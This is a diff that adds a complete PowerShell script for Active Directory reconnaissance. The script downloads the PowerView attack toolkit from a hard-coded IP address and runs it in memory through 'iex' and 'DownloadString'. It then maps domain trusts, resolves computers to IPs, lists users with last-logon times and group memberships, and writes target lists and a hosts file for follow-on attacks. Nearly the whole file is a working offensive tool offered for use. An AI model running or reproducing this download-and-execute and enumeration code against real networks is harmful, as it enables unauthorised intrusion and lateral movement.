@@ -1,0 +1,144 @@
+<#
+.SYNOPSIS
+    Enumerates domain computers, users, trusts; outputs aligned tables to files; displays aggregates.
+.DESCRIPTION
+    - Loads PowerView
+    - Discovers primary and trusted domains
+    - Generates per-domain files:
+      * <domain>_computers.txt
+      * <domain>_users.txt
+    - Aggregates:
+      * potential_users.txt (with Groups column)
+      * etc_hosts.txt (aligned, no headers)
+    - Displays all with aligned columns and filenames
+#>
+
+# Configuration
+$PowerViewURL = 'http://192.168.45.218/PowerView.ps1'
+
+# Load PowerView
+Write-Host 'Loading PowerView...' -ForegroundColor Magenta
+try {
+    iex (New-Object Net.WebClient).DownloadString($PowerViewURL)
+    Write-Host 'PowerView loaded!' -ForegroundColor Green
+} catch {
+    Write-Host 'Error: Cannot load PowerView.' -ForegroundColor Red
+    exit 1
+}
+
+# Discover domains
+$primary = (Get-NetDomain).Name
+$trusts  = Get-DomainTrustMapping | Select-Object SourceName,TargetName
+$domains = @($primary) + ($trusts | ForEach-Object { @($_.SourceName, $_.TargetName) })
+$domains = $domains | Where-Object { $_ } | Sort-Object -Unique
+Write-Host "Domains: $($domains -join ', ')" -ForegroundColor Cyan
+
+# Reset aggregated files
+Remove-Item potential_users.txt, etc_hosts.txt -ErrorAction SilentlyContinue
+function Reset-File { param($p) if (Test-Path $p) { Remove-Item $p } }
+
+# Initialize accumulators
+$PotentialList = @()
+$HostList      = @()
+
+# Process each domain
+foreach ($d in $domains) {
+    # Blank line before each domain processing
+    Write-Host ''
+    Write-Host "Processing: $d" -ForegroundColor Cyan
+
+    # Prepare per-domain files
+    $computersFile = "${d}_computers.txt"
+    $usersFile     = "${d}_users.txt"
+    Reset-File $computersFile; Reset-File $usersFile
+
+    # Enumerate computers and build objects
+    try {
+        $rawComps = Get-NetComputer -Domain $d | Select-Object Name, DnsHostName, OperatingSystem
+    } catch {
+        Write-Host "  Skipped $d (unreachable)" -ForegroundColor Red
+        continue
+    }
+    $computers = $rawComps | ForEach-Object {
+        # Resolve IP
+        try {
+            $ip = Resolve-DnsName -Name $_.DnsHostName -Type A -ErrorAction Stop |
+                  Select-Object -ExpandProperty IPAddress -First 1
+        } catch {
+            $ip = ''
+        }
+        [PSCustomObject]@{
+            Name = $_.Name
+            FQDN = $_.DnsHostName
+            OS   = ($_.OperatingSystem -replace '\s+', ' ')
+            IP   = $ip
+        }
+    }
+
+    # Write aligned computers table
+    $computers |
+      Format-Table Name, FQDN, OS, IP -AutoSize |
+      Out-String -Width 120 |
+      Out-File $computersFile -Encoding utf8
+
+    Write-Host '  Computers file:' -NoNewline; Write-Host " $computersFile" -ForegroundColor Yellow
+    Get-Content $computersFile | ForEach-Object { Write-Host "    $_" }
+
+    # Accumulate for hosts entries
+    $HostList += $computers | Select-Object IP, @{Name='Hostname';Expression={$_.FQDN}}, @{Name='Alias';Expression={$_.Name}}
+
+    # Enumerate users
+    $users = Get-NetUser -Domain $d | Select-Object @{n='User';e={$_.SamAccountName}}, LastLogon
+
+    # Write aligned users table
+    $users |
+      Format-Table User, LastLogon -AutoSize |
+      Out-String -Width 120 |
+      Out-File $usersFile -Encoding utf8
+
+    Write-Host '  Users file:' -NoNewline; Write-Host " $usersFile" -ForegroundColor Yellow
+    Get-Content $usersFile | ForEach-Object { Write-Host "    $_" }
+
+    # Accumulate potential active users with Groups
+    $activeUsers = $users | Where-Object { $_.LastLogon -is [DateTime] -and $_.LastLogon.Year -gt 1900 }
+    if ($activeUsers) {
+        foreach ($u in $activeUsers) {
+            # Retrieve groups for each user
+            try {
+                $groups = Get-DomainGroup -MemberIdentity $u.User -Domain $d |
+                          Select-Object -ExpandProperty SamAccountName
+                $groupList = $groups -join ','
+            } catch {
+                $groupList = ''
+            }
+            $PotentialList += [PSCustomObject]@{
+                Domain    = $d
+                User      = $u.User
+                LastLogon = $u.LastLogon
+                Groups    = $groupList
+            }
+        }
+    }
+}
+
+# Write aligned potential users table (with Groups)
+$PotentialList |
+  Format-Table Domain, User, LastLogon, Groups -AutoSize |
+  Out-String -Width 200 |
+  Out-File 'potential_users.txt' -Encoding utf8
+
+# Display potential users with filename
+Write-Host "`nPotential Users file: potential_users.txt" -ForegroundColor Yellow
+Get-Content 'potential_users.txt' | ForEach-Object { Write-Host "  $_" }
+
+# Write aligned hosts entries table (no headers)
+$HostList |
+  Format-Table IP, Hostname, Alias -AutoSize -HideTableHeaders |
+  Out-String -Width 120 |
+  Out-File 'etc_hosts.txt' -Encoding utf8
+
+# Display hosts entries with filename
+Write-Host "`nHosts Entries file: etc_hosts.txt" -ForegroundColor Yellow
+Get-Content 'etc_hosts.txt' | ForEach-Object { Write-Host "  $_" }
+
+Write-Host 'Done!' -ForegroundColor Magenta
